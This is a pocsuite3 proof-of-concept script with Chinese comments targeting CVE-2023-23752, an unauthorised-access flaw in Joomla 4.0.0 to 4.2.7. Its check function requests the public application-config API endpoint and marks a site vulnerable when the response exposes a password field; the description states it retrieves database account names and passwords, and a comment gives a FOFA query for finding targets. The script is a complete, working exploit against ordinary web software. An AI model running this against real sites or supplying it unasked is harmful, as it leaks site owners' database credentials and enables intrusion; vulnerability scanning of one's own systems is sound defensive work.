from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)
import urllib3

urllib3.disable_warnings()


class Joomla(POCBase):
    # fofa语句: app="SDT-CW3B1"
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "derian"  # PoC作者的大名
    vulDate = "2023-02-24"  # 漏洞公开的时间,不知道就写今天
    createDate = "2023-02-24"  # 编写 PoC 的日期
    updateDate = "2023-02-24"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/search?q=CVE-2023-23752"]  # 漏洞地址来源,0day不用写
    name = "Joomla 未授权访问"  # PoC 名称
    appPowerLink = "http://Joomla.com"  # 漏洞厂商主页地址
    appName = "Joomla 未授权访问漏洞"  # 漏洞应用名称
    appVersion = " 4.0.0 <= Joomla <= 4.2.7"  # 漏洞影响版本
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """Joomla 未授权访问漏洞,可以直接获取网站最重要的配置信息，包含数据库的账号与密码"""  # 漏洞简要描述

    ocDesc = """/api/index.php/v1/config/application?public=true"""  # POC用法描述

    def _check(self):
        vul_lst = []

        self.path = "/api/index.php/v1/config/application?public=true"
        url = self.url + self.path
        try:
            headers = {
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Connection': 'close'
            }

            response = requests.request("GET", url, headers=headers, verify=False)
            if "links" in response.text and "\"password\":" in response.text:
                vul_lst.append(url)
        except Exception as e:
            print(e)
        finally:
            return vul_lst

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Path'] = self.path
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


# 注册 DemoPOC 类
register_poc(Joomla)
